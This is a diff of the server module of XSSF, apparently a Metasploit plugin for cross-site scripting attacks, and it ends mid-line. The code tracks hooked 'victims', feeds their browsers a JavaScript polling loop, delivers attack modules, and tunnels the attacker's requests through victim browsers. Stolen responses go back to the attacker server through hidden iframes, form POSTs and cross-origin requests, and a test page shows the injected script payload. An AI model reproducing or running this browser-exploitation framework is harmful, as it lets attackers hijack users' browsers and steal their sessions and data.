@@ -1,35 +1,45 @@
 require 'cgi'
 require 'rex/ui'
-require 'base64'
 require 'uri'
+require 'webrick'
+require 'base64'
+
 
 #
-# This class implements a HTTP Server used for the new XSSF plugin.
+# This module implements a HTTP Server used for the new XSSF plugin.
 #
 module Msf
 	module Xssf
 		module XssfMaster
 			include Msf::Xssf::XssfDatabase
-			include Msf::Xssf::XssfProxy
-			
+			include Msf::Xssf::XssfTunnel
+			include Msf::Xssf::XssfGui
+	
 			#
 			# Starts the server
 			#
-			def start(host, port, uri)	
+			def start(port, uri)	
 				self.serverURI  = uri
 				self.serverPort = port
-				self.serverHost = real_address(host)
-				self.xssfServer = "#{self.serverHost}:#{self.serverPort}#{self.serverURI}"
-				return false if not register_server(self.serverHost, self.serverPort, self.serverURI)
+				self.serverHost = Rex::Socket.source_address('1.2.3.4')
 				
-				self.server = Rex::Proto::Http::Server.new(port, host)
+				self.server  = WEBrick::HTTPServer.new(
+					:Port				=> port,
+					:Logger				=> WEBrick::Log.new(Logger.new($stdout), WEBrick::Log::FATAL),
+					:AccessLog			=> [[ WEBrick::Log.new(Logger.new($stdout), WEBrick::Log::FATAL), WEBrick::AccessLog::COMBINED_LOG_FORMAT ]],
+					:ServerSoftware 	=> "WEBrick (Ruby)",
+					:ServerType 		=> Thread,
+					:MaxClients     	=> 1000,
+					:DoNotReverseLookup => true
+				)
+
+				self.server.mount_proc("#{uri}") { |req, res| xssf_process_request(req, res) }	# Listening connections to URI
 				self.server.start
 
-				self.server.add_resource(self.serverURI,'Proc' => Proc.new { |cli, request| xssf_server_request(cli, request) }) 	# Listening connections to URI
-				self.server.add_resource("[a-zA-Z]"	   ,'Proc' => Proc.new { |cli, request| xssf_proxy_request(cli, request)  })	# Listening others connections (PROXY mode)
+				return false if not register_server(self.serverHost, port, uri)				
 
 				# Check in background for active victims !
-				Thread.new do; while (self.server) do;	update_active_victims;	Rex::ThreadSafe.sleep(5);	end; end
+				Thread.new do; while (self.server) do;	update_active_victims;	Rex::ThreadSafe.sleep(2);	end; end
 				
 				return true
 			end
@@ -38,115 +48,111 @@ module Msf
 			# Stops the server
 			#
 			def stop
-				self.server.remove_resource(".")
-				self.server.stop if self.server
-				self.server = nil
+				(self.server.unmount("#{self.serverURI}"); self.server.shutdown) if self.server;
 			end
-
+			
 			#
 			# This method is triggered each time a request is done on the URI.
 			#
-			def xssf_server_request(cli, request)
+			def xssf_process_request(req, res)
 				begin
-					case request.method.upcase
-						when 'GET';		process_get(cli, request)	# Case of a GET request
-						when 'POST';	process_post(cli, request)	# Case of a POST request
-						else;			self.server.send_e404(cli, request)	
+					if ((req.unparsed_uri.to_s =~ /^http:\/\/.*$/) && (req.host != self.serverHost))	# Request done in Tunnel mode
+						if ((victim_tunneled && (req.request_method =~ /^(GET|POST)$/i)) && 
+							((req.remote_ip == self.serverHost) or (req.remote_ip == "localhost") or (req.remote_ip == "127.0.0.1") or XSSF_FROM_OUTSIDE[0]) )
+							xssf_tunnel_request(req, res, victim_tunneled)
+						else
+							XSSF_404(res)
+						end
+					else																																			# Request done to access a server ressource	
+						req.query["#{PARAM_ID}"] ? id = (req.query["#{PARAM_ID}"]).to_i : ((req.cookies.to_s =~ /#{PARAM_ID}=(\d+)/) ? id = $1.to_i : id = nil)
+						
+						case req.request_method.upcase
+							when 'GET';		process_get(req, res, id)			# Case of a GET request
+							when 'POST';	process_post(req, res, id) 			# Case of a POST request
+							else;			process_unknown(req, res, id)
+						end
 					end
 				rescue
-					self.server.send_e404(cli, request)	
+					XSSF_404(res) 
+					print_error("Error 0: #{$!}") if XSSF_DEBUG_MODE[0]
 				end
 			end
 
 			#
 			# Manages GET requests
 			#
-			def process_get(cli, request)
-				interval = VICTIM_INTERVAL;		location = "Unknown";	id = nil
-				
-				(request.param_string.split('&')).each do |p|
-					interval= Integer($1) 	if (p =~ /^#{PARAM_INTERVAL}=(\d+)$/)
-					location= $1 			if (p =~ /^#{PARAM_LOCATION}=(.+)$/)
-					id		= Integer($1) 	if (p =~ /^#{PARAM_ID}=(.+)$/)
-				end
-				
-				((request['Cookie'] =~ /#{PARAM_ID}=(\d+)/) ? id = Integer($1) : id = nil) if not (id)
+			def process_get(req, res, id)
+				interval = VICTIM_INTERVAL 	unless (interval = req.query["#{PARAM_INTERVAL}"])
 
-				case request.uri_parts['Resource']
+				case req.path
 					# Page asked is the victim loop page : Send loop page to the victim if correctly saved in the database
-					when /^\/#{VICTIM_LOOP}$/, /#{self.xssfServer + VICTIM_LOOP}$/
+					when /^#{self.serverURI + VICTIM_LOOP}/
 						if (id)
-							get_victim(id) ? update_victim(id, "Unknown", interval) : (id = add_victim(cli.peerhost, interval, request['User-Agent'].downcase))
+							get_victim(id) ? update_victim(id, "Unknown", interval.to_i) : (id = add_victim(req.remote_ip, interval.to_i, req.header['user-agent'][0].downcase))
 						else
-							id = add_victim(cli.peerhost, interval, request['User-Agent'].downcase)
+							id = add_victim(req.remote_ip, interval.to_i, req.header['user-agent'][0].downcase)
 						end
 						
 						if (id)
 							# If auto attacks are running for this new victim, then we add first one to the victim
 							add_auto_attacks(id)
 
-							# Don't know how P3P works (Compact Cookies Policy for IE), but it works !
-							send_response(cli, loop_page(id) + xssf_post(id), 200, "OK", {'Content-Type' => 'application/javascript', 'P3P' => 'CP="CAO PSA OUR"', 'Set-Cookie' => "id=#{id}"})
+							XSSF_RESP(res, loop_page(id, req.host) + xssf_post(id, req.host), 200, "OK", {	
+																						'Content-Type' 					=> 'application/javascript', 
+																						'P3P' 							=> 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"', 			# Don't know how P3P works (Compact Cookies Policy for IE / Safari), but it works !
+																						'Set-Cookie' 					=> "id=#{id}; Path=/;"})
 						else
-							self.server.send_e404(cli, request)
+							XSSF_404(res)
 						end
 
 					# Page asked is the victim ask page (victim is asking for new commands)
-					when /^\/#{VICTIM_ASK}$/, /#{self.xssfServer + VICTIM_ASK}$/
+					when /^#{self.serverURI + VICTIM_ASK}/
 						if (id)	# If an id is given, check if victim is in an attack process or not
-							update_victim(id, location)
-
-							victim_cookie(id) if (request['Cookie'])
+							update_victim(id, req.query["#{PARAM_LOCATION}"], nil, ((req.cookies.size.to_i == 0) ? "NO" : "YES"))
 								
-							if (res = get_first_attack(id))								# If an attack is waiting for current victim
-								if (http_request_module(cli, res[0], request, id))
-									puts ""
-									print_good("Code '#{res[1]}' sent to victim '#{id}'")
-									attacked_victims
-									create_log(id, "Attack '#{res[1]}' launched at url '#{res[0]}'", nil) 
+							if (attack = get_first_attack(id))								# If an attack is waiting for current victim (attacks are done in priority, then tunnel)
+								if (http_request_module(res, attack[0], req, id))
+									puts ""; 			print_good("Code '#{attack[1]}' sent to victim '#{id}'")
+									attacked_victims; 	create_log(id, "Attack '#{attack[1]}' launched at url '#{attack[0]}'", nil) 
 								end
 							else
 								if (victim = victim_tunneled)
-									if ((victim.id == id) and (TUNNEL[1] == "TO_SEND"))
-										TUNNEL[1] = "SENT"
-										send_response(cli, TUNNEL[0], 200, "OK", {'Content-Type' => 'application/javascript'})
+									if (victim.id == id)
+										code = ""
+										
+										TUNNEL_LOCKED.synchronize {
+											TUNNEL.each do |key, value|
+												if (value[0] != nil)
+													code << %Q{ #{Base64.decode64(value[0])} } 
+													TUNNEL[key][0] = nil
+												end
+											end
+										}
+										
+										(code == "") ? XSSF_404(res) : XSSF_RESP(res, code, 200, "OK", {'Content-Type' 					=> 'application/javascript', 
+																										'P3P' 							=> 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"', 
+																										'Set-Cookie' 					=> "id=#{id}; Path=/;"})
 									else
-										self.server.send_e404(cli, request)
+										XSSF_404(res)
 									end
 								else
-									self.server.send_e404(cli, request)
+									XSSF_404(res)
 								end
 							end
 						else
-							self.server.send_e404(cli, request)
+							XSSF_404(res)
 						end
 
 					# Page asked is the XSSF test page (for test or ghost)
-					when /^\/#{VICTIM_TEST}$/, /#{self.xssfServer + VICTIM_TEST}$/
-						send_response(cli, test_page)
+					when /^#{self.serverURI + VICTIM_TEST}/
+						XSSF_RESP(res, test_page(req.host))
 						
 					# Victim log page is asked
-					when /^\/#{VICTIM_LOG}$/, /#{self.xssfServer + VICTIM_LOG}$/
-						(cli.peerhost == self.serverHost) ? send_response(cli, export_attacks(id)) : self.server.send_e404(cli, request)
-
-					# Other page is asked by a victim : redirect to known file or active module (This part needs cookie to be activated)
-					else 
-						if (id)
-							# If file is known, server sends it directly to the victim, if not, asking to the module !
-							if (request.param_string.empty? and File.exist?(INCLUDED_FILES + request.uri_parts['Resource']) and (request.uri_parts['Resource'] != '/'))
-								send_response(cli, add_xssf_post(read_file(INCLUDED_FILES + request.uri_parts['Resource']), id))
-							else
-								if (url = current_attack(id)) 
-									uri = URI.parse(url)
-									(url = url.gsub(/#{uri.path}/, "") + uri.path + request.raw_uri) if (uri.path != '/')
-									(data = run_http_client(url)) ? send_response(cli, add_xssf_post(data.body, id), data.code, data.message, data.headers) : self.server.send_e404(cli, request)
-								else
-									self.server.send_e404(cli, request)
-								end
-							end
-						else
-							self.server.send_e404(cli, request)
-						end
+					when /^#{self.serverURI + VICTIM_GUI}/
+						build_log_page(req, res)
+						
+					else # Other page is asked by a victim : redirect to known file or active module (This part needs cookie to be activated) 
+						process_unknown(req, res, id)
 				end
 			end
 
@@ -154,144 +160,221 @@ module Msf
 			# Manage POST requests
 			# Called when the victims responds to an attack (if attack send a response)
 			#
-			def process_post(cli, request)
-				case request.uri_parts['Resource']
-					when /^\/#{VICTIM_ANSWER}$/, /#{self.xssfServer + VICTIM_ANSWER}$/
-						response = nil; tunnel_ctype = nil; resp_type = nil; mod_name = nil; id = nil;
+			def process_post(req, res, id)
+				response = "";	tunnel_headers = "";	mod_name = "Unknown";	tunnelid = nil;
 
-						(request.body.split('&')).each do |p|
-							response 	= $1 			if (p =~ /^#{PARAM_RESPONSE}=(.*)$/)
-							tunnel_ctype= $1 			if (p =~ /^#{PARAM_CTYPE}=(.+)$/)
-							resp_type	= Integer($1) 	if (p =~ /^#{PARAM_TYPE}=(.+)$/)
-							mod_name	= $1 			if (p =~ /^#{PARAM_NAME}=(.+)$/)
-							id			= Integer($1) 	if (p =~ /^#{PARAM_ID}=(.+)$/)
+				if req.query["#{PARAM_ID}"]
+					response 		= req.query["#{PARAM_RESPONSE}"] 	if req.query["#{PARAM_RESPONSE}"] 
+					tunnel_headers	= req.query["#{PARAM_HEADERS}"] 	if req.query["#{PARAM_HEADERS}"]
+					mod_name		= req.query["#{PARAM_NAME}"] 		if req.query["#{PARAM_NAME}"]
+					tunnelid		= req.query["#{PARAM_RESPID}"] 		if req.query["#{PARAM_RESPID}"]
+				else		# Sometimes Cross-Requests aren't well understood by the Webrick server parser cause Content-Type isn't properly set by browser
+					(req.body.split('&')).each do |p|
+						response 		= $1 			if (p =~ /^#{PARAM_RESPONSE}=(.*)$/)
+						tunnel_headers	= $1 			if (p =~ /^#{PARAM_HEADERS}=(.+)$/)
+						mod_name		= $1 			if (p =~ /^#{PARAM_NAME}=(.+)$/)
+						id				= Integer($1) 	if (p =~ /^#{PARAM_ID}=(.+)$/)
+						tunnelid		= $1 			if (p =~ /^#{PARAM_RESPID}=(.+)$/)
+					end
+				end
+				
+				case req.path
+					when /^#{self.serverURI + VICTIM_ANSWER}/
+						(is_tunneled = (is_tunneled.id == id)) if (is_tunneled = victim_tunneled)
+						
+						if (is_tunneled)					# POST IN TUNNEL MODE
+							tunnelid = URI.unescape(tunnelid)
+							if(TUNNEL[tunnelid])
+								TUNNEL_LOCKED.synchronize {
+									TUNNEL[tunnelid][2] = Base64.encode64((URI.unescape(tunnel_headers)).strip)
+									TUNNEL[tunnelid][1] = Base64.encode64(response)
+			
+									TUNNEL.delete(tunnelid) if ((TUNNEL[tunnelid][1].to_s).size > 10000000) 	# Deleting if more than 10Mo of data	
+								}
+
+								print_good("ADDING RESPONSE IN TUNNEL (#{tunnelid.to_s})")
+								XSSF_RESP(res)
+							else
+								XSSF_404(res)
+							end
+						else								# POST FROM A MODULE
+							file_id = Rex::Text.rand_text_alphanumeric(rand(20) + 10)
+							File.open(INCLUDED_FILES + XSSF_LOG_FILES + file_id.to_s, 'wb') {|f| f.write((response =~ /__________(.*)__________/) ? URI.unescape(Base64.decode64($1)) : URI.unescape(response)) }
+							create_log(id, file_id, URI.unescape(mod_name).strip)
+							XSSF_RESP(res)
 						end
 						
-						((request['Cookie'] =~ /#{PARAM_ID}=(\d+)/) ? id = Integer($1) : id = nil) if not (id)
+					when /^#{self.serverURI + VICTIM_SAFARI}/
+						XSSF_RESP(res, "", 200, "OK", {	'Content-Type' 	=> 'text/html', 
+														'P3P' 			=> 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"',
+														'Set-Cookie' 	=> "id=#{id}; Path=/;"})
+					
+					else # Other page is asked by a victim : redirect to known file or active module (This part needs cookie to be activated) 
+						process_unknown(req, res, id)
+				end
+			end
 
-						if (id && resp_type)
-							case resp_type
-								when 0				# POST FROM A MODULE
-									create_log(id, CGI::unescape(response).strip, CGI::unescape(mod_name).strip)
-									send_response(cli, "OK")
-								when 1				# POST IN PROXY MODE
-									if(TUNNEL[1] == "SENT")
-										TUNNEL[2] = (CGI::unescape(tunnel_ctype)).strip if tunnel_ctype
-										response ? TUNNEL[1] = CGI::unescape(response).strip : TUNNEL[1] = ""
-
-										print_good("ADDING RESPONSE IN TUNNEL FOR '#{TUNNEL[3]}'")
-										send_response(cli, "OK")
-									else
-										self.server.send_e404(cli, request)
-									end
-								else
-									self.server.send_e404(cli, request)
-							end
-						else
-							self.server.send_e404(cli, request)
-						end
+			#
+			# Unknown page or method is asked by a victim
+			# Redirect to known file or active module (This part needs cookie to be activated)
+			#
+			def process_unknown(req, res, id)
+				file_name = INCLUDED_FILES + Rex::Text.to_hex_ascii(req.unparsed_uri)
+				
+				if (File.exist?(file_name) and (Rex::Text.to_hex_ascii(req.unparsed_uri) != '/'))			# If file is known, server sends it directly to the victim, if not, asking to the module !
+					if (((file_name =~ /#{XSSF_GUI_FILES}/i) or (file_name =~ /#{XSSF_LOG_FILES}/i)) and not ((req.remote_ip == self.serverHost) or XSSF_FROM_OUTSIDE[0]))
+						XSSF_404(res)
 					else
-						self.server.send_e404(cli, request)
+						XSSF_RESP(res, add_xssf_post(File.open(file_name, "rb") {|io| io.read }, id, req.host), 200, "OK", {'Content-type' => (File.extname(file_name) == '.html') ? 'text/html' : 'application/octet-steam'})
+					end
+				else
+					if (url = current_attack(id))	
+						(data = run_http_client(url, req, true)) ? XSSF_RESP(res, add_xssf_post(data.body, id, req.host), data.code, data.message, data.headers) : XSSF_404(res)
+					else
+						XSSF_404(res)
+					end
 				end
 			end
 			
+		protected
+			attr_accessor :server, :serverURI, :serverPort, :serverHost
+			
 			#
-			# Returns real network address
+			# Sends XSSF 404 page
 			#
-			def real_address(ip)
-				return Rex::Socket.source_address('1.2.3.4') if (ip == '0.0.0.0') 
-				return ip
+			def XSSF_404(res)
+				res['Access-Control-Allow-Origin']	= '*'
+				res.status = 404
+			end
+			
+			#
+			# Sends XSSF HTML response
+			#
+			def XSSF_RESP(res, body = "", code = 200, message = "OK", headers = {})
+				res['Content-Type'] 				= "text/html"			# Default, can be errased with headers
+				res['Access-Control-Allow-Origin']	= '*'
+				res['Cache-Control'] 				= 'post-check=0, pre-check=0, must-revalidate, no-store, no-cache'
+				res['Pragma'] 						= 'no-cache'  
+				res['Last-Modified'] 				= Time.now + 1000000000
+				res['Expires'] 						= Time.now - 1000000000
+				
+				res.body = body;		res.status = code;		res.reason_phrase = message
+				headers.each_pair { |k,v| res[k] = v }
+				
+				res['Content-Length'] 		= body.size
+				res['Connection'] 			= 'close'
 			end
 
-		protected
-			attr_accessor :server, :serverURI, :serverPort, :serverHost, :xssfServer
-			
-			#
-			# Transmits a response to the supplied client
-			#
-			def send_response(cli, body, code = 200, message = "OK", headers = {})
-				response = Rex::Proto::Http::Response.new(code, message, Rex::Proto::Http::DefaultProtocol);
-				response['Content-Type'] = 'text/html'
-				response.body = body
-				headers.each_pair { |k,v| response[k] = v }
-				cli.send_response(response)
-			end
-			
 			#
 			# Acts like a client and server. 
 			# Ask for a page to a module and forward the result to the client.
 			# If module sends complete html page, creates an iframe on client side
 			#
-			def http_request_module(cli, url, request, id)
-				data = run_http_client(url)
+			def http_request_module(res, url, req, id)
+				data = run_http_client(url, req, false)
+
 				if (data != nil)
-					if ((data.code == 302) && data['Location'])
-						code = %Q{
-							iframe = createCrossIframe("REDIRECT_IFRAME", 150, 150);
-							iframe.src = "http://#{self.xssfServer}#{data['Location']}";
-							document.body.appendChild(iframe);
-						}
+					data.headers['P3P'] 							= 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"'
+					data.headers['Set-Cookie'] 						= "id=#{id}; Path=/;"
+								
+					case (data.code).to_s
+						when /1..|4..|5../
+							XSSF_404(res)
+							
+						when /3../
+							if (data['Location'])
+								src = "#{req.host}:#{self.serverPort}#{self.serverURI}#{data['Location']}".gsub(/\/\//, '/')
+								
+								code = %Q{
+									iframe = XSSF_CREATE_IFRAME("REDIRECT_IFRAME", 50, 50);
+									iframe.src = "http://#{src}";
+									document.body.appendChild(iframe);
+								}
 						
-						data['Content-Type'] = "text/javascript"
-						send_response(cli, code, "200", "OK", data.headers)
-					elsif (data.body =~ /^(.*<html[^>]*>)(.*)(<\/html>.*)$/im)
-						# Can't create IFRAME dynamically because we need the src to be the attack server ! Victim need to ask again
-						code = %Q{
-							iframe = createCrossIframe("REDIRECT_IFRAME", 150, 150);
-							iframe.src = "http://#{self.xssfServer}#{((URI.parse(url)).path == '/') ? "" : (URI.parse(url)).path}";
-							document.body.appendChild(iframe);
-						}
+								data['Content-Type'] = "text/javascript"
+								XSSF_RESP(res, code, "200", "OK", data.headers)
+								return true
+							else
+								XSSF_404(res)
+							end
+							
+						else 	# 2xx
+							if (data.body =~ /^(.*<html[^>]*>)(.*)(<\/html>.*)$/im)	
+								src = "#{req.host}:#{self.serverPort}#{self.serverURI}#{URI.parse(URI.escape(url)).path.to_s}".gsub(/\/\//, '/')
+								
+								# Can't create IFRAME dynamically because we need the src to be the attack server ! Victim need to ask again
+								code = %Q{
+									iframe = XSSF_CREATE_IFRAME("MODULE_IFRAME", 50, 50);
+									iframe.src = "http://#{src}";
+									document.body.appendChild(iframe);
+								}
 
-						data['Content-Type'] = "text/javascript"
-						send_response(cli, code, data.code, data.message, data.headers)
-					else
-						send_response(cli, add_xssf_post(data.body, id), data.code, data.message, data.headers)
+								data['Content-Type'] = "text/javascript"
+								XSSF_RESP(res, code, data.code, data.message, data.headers)
+								return true
+							else
+								XSSF_RESP(res, add_xssf_post(data.body, id, req.host), data.code, data.message, data.headers)
+								return true
+							end
 					end
-					
-					return true
 				else
-					self.server.send_e404(cli, request)
-					return false
+					XSSF_404(res)
 				end
+				
+				return false
 			end
-
+			
 			#
 			# Adds XSSF_POST function to html pages in iframes
 			#
-			def add_xssf_post(data, id)
+			def add_xssf_post(data, id, host)
 				if (data =~ /^(.*<head[^>]*>.*)(<\/head>.*)$/im)
-					data = $1 + %Q{ <script type='text/javascript'>  		} + xssf_post(id) + %Q{ </script> } + $2
+					data = $1 + %Q{ <script type='text/javascript'>  		} + xssf_post(id, host) + %Q{ </script> } + $2
 				elsif (data =~ /^(.*<html[^>]*>)(.*<\/html>.*)$/im)
-					data = $1 + %Q{ <head> <script type='text/javascript'>  } + xssf_post(id) + %Q{ </script> </head>} + $2
+					data = $1 + %Q{ <head> <script type='text/javascript'>  } + xssf_post(id, host) + %Q{ </script> </head>} + $2
 				end
-				
 				return data
 			end
 			
 			#
 			# Runs an HTTP client on a given url
 			#
-			def run_http_client(url)
+			def run_http_client(url, req, process_params)
 				begin
-					if (url =~ /^http:\/{1,2}([a-z0-9\-\.]+)(:([0-9]{1,5}))?(\/.*)?$/)
-						client = Rex::Proto::Http::Client.new($1, $3 ? $3 : 80, {}, false)
-						resp = client.send_recv(client.request_raw('method' => 'GET', 'uri'    => $4), -1)
-						client.close
-						return resp
-					end
-				rescue	# Nothing
+					parsed_url 	= URI.parse(URI.escape(CGI::unescape(url)))
+					client 		= Rex::Proto::Http::Client.new(parsed_url.host, parsed_url.port, {}, false)
+					
+					(req.unparsed_uri =~ /^#{parsed_url.path}/) ? uri = req.unparsed_uri : uri = parsed_url.path + req.unparsed_uri
+					
+					resp = client.send_recv(client.request_raw(
+												'method'=> req.request_method, 
+												'vhost'	=> parsed_url.host + ':' + parsed_url.port.to_s,
+												'agent' => req.header['user-agent'][0],
+												'cookie'=> req.cookies[0],
+												'uri'	=> process_params ? Rex::Text.to_hex_ascii(uri).gsub(/\\x/, '%') : parsed_url.path,
+												'data'  => process_params ? req.body : ""
+											))
+					client.close
+					return resp
+				rescue
+					print_error("Error 1: #{$!}") if XSSF_DEBUG_MODE[0]
+					return nil
 				end
-				return nil
 			end
 			
 			#
 			# Returns test page
 			#
-			def test_page
+			def test_page(host)
 				return %Q{ 	<html><body>
 								<h2> TEST PAGE WITH XSS </h2><br/>
-								<pre> INJECTED : &lt;script type=&quot;text/javascript&quot; src=&quot;http://#{self.xssfServer}#{VICTIM_LOOP}?#{PARAM_INTERVAL}=5&quot;&gt;&lt;/script&gt;</pre>
-								<script type="text/javascript" src= "http://#{self.xssfServer}#{VICTIM_LOOP}?#{PARAM_INTERVAL}=5" ></script>
+								<pre> INJECTED : &lt;script type=&quot;text/javascript&quot; src=&quot;http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_LOOP}?#{PARAM_INTERVAL}=5&quot;&gt;&lt;/script&gt;</pre>
+								<script type="text/javascript">
+									s = document.createElement('script');
+									s.src = "http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_LOOP}?#{PARAM_INTERVAL}=5&time=" + escape(new Date().getTime());
+									document.body.appendChild(s);
+								</script>
+
 								<a href="http://www.google.fr">Go GoOgLe</a>
 							</body></html>
 				}
@@ -300,32 +383,59 @@ module Msf
 			#
 			# Returns loop page
 			#
-			def loop_page(id)
+			def loop_page(id, host)
 				loop = %Q{
-					function executeCode() {
-						if (document.getElementById('XSSF_CODE') != null) document.body.removeChild(document.getElementById('XSSF_CODE'));
+					function XSSF_EXECUTE_LOOP() {
+						try { if (document.getElementById('XSSF_CODE') != null) document.body.removeChild(document.getElementById('XSSF_CODE')); } catch(e) {}
 						script = document.createElement('script');	script.id = "XSSF_CODE";
-						script.src = "http://#{self.xssfServer}#{VICTIM_ASK}?#{PARAM_LOCATION}=" + window.location + "&#{PARAM_ID}=#{id}&time=" + escape(new Date().getTime());
+						script.src = "http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_ASK}?#{PARAM_LOCATION}=" + encodeURI(window.location) + "&#{PARAM_ID}=#{id}&time=" + escape(new Date().getTime());
 						document.body.appendChild(script);
 					}
 	
-					if (typeof(victim_loop) != "undefined")	clearTimeout(victim_loop);
-					victim_loop = setInterval(executeCode, #{(victim = get_victim(id)) ? victim.interval : VICTIM_INTERVAL} * 1000);	// Interrompt with clearTimeout(victim_loop);
+					if (typeof(XSSF_LOOP) != "undefined")	clearInterval(XSSF_LOOP);
+					XSSF_LOOP = setInterval(XSSF_EXECUTE_LOOP, #{(victim = get_victim(id)) ? victim.interval : VICTIM_INTERVAL} * 1000);	// Interrupt with clearInterval(XSSF_LOOP);
 				}
 
 				return loop
 			end
 			
 			#
-			# Returns XSSF_POST function to code
+			# Returns XSSF provided functions, including XSSF_POST
 			#
-			def xssf_post(id)
-				return %Q{
-					SERVER = "http://#{self.xssfServer}";
-					
-					function createXHR() {
+			# XSSF POST METHODS EXPLANATION :
+			#    * OPTION 1 : using <image src="http://XSSF_SERVER/data=xxxxx" />. 
+			#		+ Supported by all browsers
+			#		- Limited by URI size (2083 bytes in IE). 
+			#		- Long URI size (>= 1Mo) end with a Webrick crash.
+			#    * OPTION 2 : using a <FORM> element within invisible <IFRAME> posting to XSSF_SERVER. 
+			#		+ Supported by all browsers
+			#		+ No size limitation inside browser
+			#		- Secured domain (HTTPS) will prompt user that secure data is sent over unsecure method
+			#     * OPTION 3 : using the new Cross-Origin Resource Sharing property with XMLHttpRequest or XDomainRequest elements.
+			#       + No size limitation inside browser
+			#       + Works without alerting user on HTTPs domains
+			#		- Only supported by browser implementing HTML5 Cross-Origin Resource Sharing specification (IE 8+, FF 3.5+, Safari 4+, Chrome, Android Browser 2.1+, IOS Safari 3.2+)
+			#
+			# -------------------------------------------------------------------------
+			# |   HTTP TARGETED DOMAIN   ||           HTTPS TARGETED DOMAIN           |
+			# -------------------------------------------------------------------------
+			# |                          ||   CORS SUPPORTED    || CORS NOT SUPORTED  |
+			# |                          ||-------------------------------------------|
+			# |         OPTION 2         ||                     ||     OPTION 2       |
+			# |                          ||      OPTION 3       ||   User will be     |
+			# |                          ||                     ||     prompted?      |
+			# -------------------------------------------------------------------------
+			#
+			def xssf_post(id, host)
+				id = -1 if not id
+
+				info = browser_info(id)
+
+				code = %Q{
+					function XSSF_CREATE_XHR() {
 						if (window.XMLHttpRequest) return new XMLHttpRequest();
-	 
+						if (window.XDomainRequest) return new XDomainRequest(); 
+
 						if (window.ActiveXObject) {
 							var names = ["Msxml2.XMLHTTP.6.0", "Msxml2.XMLHTTP.3.0", "Msxml2.XMLHTTP", "Microsoft.XMLHTTP"];
 							for(var i in names) {
@@ -334,65 +444,145 @@ module Msf
 							}
 						}
 					}
-					xhr = createXHR();
-					
-					function createCrossIframe(id, width, height) {	// Creates an Iframe that enables POST to XSSF Server
+
+					function XSSF_GARBAGE() {
+						var iframes = document.getElementsByTagName('iframe');
+
+						for(var i = 0; i < iframes.length; i++)
+							if(iframes.item(i).getAttribute('name') == 'POST_IFRAME')
+								document.body.removeChild(iframes.item(i));
+					}
+					XSSF_DO_GARBAGE = setInterval(XSSF_GARBAGE, #{TUNNEL_TIMEOUT} * 1000);
+				}
+
+				if (info[0] =~ /Internet Explorer/i)	# IE Binary data transform
+					code << %Q{
+						d = document.createElement('div');	d.id = "vbDiv";	document.body.appendChild(d);
+						document.getElementById('vbDiv').innerHTML = 	unescape('%3Cscript type="text/vbscript"%3E') + ' Function XSSF_BIN_TO_ARRAY(data): \
+																		ReDim byteArray(LenB(data)): For i = 1 To LenB(data): byteArray(i-1) = AscB(MidB(data, i, 1)): Next: \
+																		XSSF_BIN_TO_ARRAY=byteArray: End Function' + unescape('%3C%2Fscript%3E');
+																		
+						function XSSF_PROCESS_BINARY(xmlhttp) {
+							data = XSSF_BIN_TO_ARRAY((xmlhttp.responseBody).toArray());
+							r = "";	size = data.length - 1;
+							for(var i = 0; i < size; i++)	r += String.fromCharCode(data[i]);
+							return r;
+						}
+					}
+				else
+					code << %Q{
+						function XSSF_PROCESS_BINARY(xmlhttp) {
+							data = xmlhttp.responseText;	r = "";		size = data.length;
+							for(var i = 0; i < size; i++)	r += String.fromCharCode(data.charCodeAt(i) & 0xff);
+							return r;
+						}
+					}
+				end
+
+				code << %Q{											
+					function XSSF_POST_BINARY_AJAX_RESPONSE(x, method, url, mod_name, data, resp_id) {
+						mod_name = mod_name || null;	data = data || null;	resp_id	= resp_id || Math.floor(Math.random()*10000000);
+						if ((method != "GET") && (method != "POST")) return;
+
+						x.open(method, url, true);
+
+						x.setRequestHeader('Cache-Control', "no-cache");		x.setRequestHeader('Accept-Charset', "x-user-defined");					
+						if (x.overrideMimeType) 								x.overrideMimeType('text/plain; charset=x-user-defined');
+
+						if (method == "POST"){
+							x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+							x.setRequestHeader("Content-length", data.length);		
+							x.setRequestHeader("Connection", "close");
+						}	
+						x.send(unescape(data));
+
+						x.onreadystatechange=function() {
+							if (x.readyState == 4) 
+								XSSF_POST(XSSF_PROCESS_BINARY(x), mod_name, x.getAllResponseHeaders() + "\\n===" + x.status + "===\\n==" + x.statusText + "==", resp_id);
+						}
+					}
+
+					function XSSF_CREATE_IFRAME(id, width, height) {		// Creates an Iframe
 						if (document.getElementById(id) != null) document.body.removeChild(document.getElementById(id));
 						
-						iframe = document.createElement('iframe');
-						iframe.id = id;
-						iframe.width = "0" + width + "%";
-						iframe.height = "0" + height + "%";
-						iframe.style.border = "0px";
-						iframe.frameborder = "0";
-						iframe.scrolling = "auto";
-						iframe.style.backgroundColor = "transparent";
+						i = document.createElement('iframe');	i.id = id;
+						i.width = "0" + width + "%";			i.height = "0" + height + "%";
+						i.style.border = "0px";					i.frameborder = "0";
+						i.scrolling = "auto";					i.style.backgroundColor = "transparent";
 						
-						return iframe;
+						return i;
 					}
-
-					function XSSF_POST(response, mod_name, tunnel_ctype, response_type) {
-						if (typeof(tunnel_ctype) == "undefined") 					tunnel_ctype = "text/html";
-						else if ((tunnel_ctype == "") || (tunnel_ctype == null))	tunnel_ctype = "text/html";
-						
-						if (typeof(mod_name) == "undefined") 						mod_name = "Unknown";
-						else if ((mod_name == "") || (mod_name == null))			mod_name = "Unknown";
-							
-						if (typeof(response_type) == "undefined") 					response_type = 0;
-						else if ((response_type == "") || (response_type == null))	response_type = 0;
-
-						iframe = createCrossIframe("XSSF_POST_IFRAME", 0, 0);
-						document.body.appendChild(iframe);
-
-						var doc = null;
-	   					if(iframe.contentDocument)		doc = iframe.contentDocument;
-	   					else if(iframe.contentWindow)   doc = iframe.contentWindow.document;
-						else if(iframe.document)		doc = iframe.document;
-						else							return;
-						
-						string  = "<form name='XSSF_FORM' id='XSSF_FORM' enctype='text/plain' method='POST' action='http://#{self.xssfServer}#{VICTIM_ANSWER}' >";
-						string += "<input name='#{PARAM_NAME}' 		value='"+escape(mod_name)+"'	type='hidden'>"; 
